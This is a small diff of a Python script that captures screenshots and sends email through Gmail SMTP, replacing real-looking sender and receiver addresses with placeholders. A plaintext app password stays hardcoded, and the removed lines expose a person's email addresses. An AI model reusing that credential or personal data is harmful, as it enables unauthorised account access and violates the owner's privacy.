@@ -46,9 +46,9 @@ def capture_and_save_screenshot(file_name="screenshot.png"):
 def send_email(subject, message, attachment_paths=None):
     smtp_server = 'smtp.gmail.com'
     smtp_port = 587
-    sender_email = 's20_siddiqui_gufran@mgmcen.ac.in'
+    sender_email = 'xyz@gmail.com'
     sender_password = 'wrry eeny bqqu vlvp'
-    receiver_email = 'siddiquigufran2002@gmail.com'
+    receiver_email = 'abc@gmail.com'
 
     msg = MIMEMultipart()
     msg['From'] = sender_email
